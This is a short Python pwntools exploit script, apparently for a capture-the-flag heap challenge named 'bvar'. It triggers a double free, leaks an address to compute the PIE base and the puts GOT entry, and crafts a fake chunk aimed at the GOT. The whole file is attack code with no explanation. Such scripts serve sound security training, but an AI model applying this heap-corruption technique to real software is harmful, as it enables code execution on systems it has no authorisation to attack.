from pwn import *

io = process('./bvar')

def add(name, value):
    print(io.recv())
    io.sendline(name+b'='+value)

def free(name):
    print(io.recv())
    io.sendline(b'delete '+name)

def view(name):
    print(io.recv())
    io.sendline(name)

def clear():
    print(io.recv())
    io.sendline(b'clear')

def edit(name, new_name):
    print(io.recv())
    io.sendline(name)
    io.sendline(new_name)

add(b'abcd', b'ABCD')
free(b'abcd')
free(b'abcd')
clear()
add(b'efgh', b'EFGH')
add(b'1234', b'AAAA')
view(b'1234')
pie = u64(io.recvline().split(b'\n')[0]+b'\0\0') - 0x2584 - 0x1000
putsgot = pie+0x3428
magic = p32(int(hex(putsgot)[6:], 16) - 8)
pause()

clear()
add(b'abcd', b'ABCD')
free(b'abcd')
free(b'abcd')
add(magic, b'EFGH')
clear
add(magic, b'AAAA')
view(magic)
print(io.recvline())
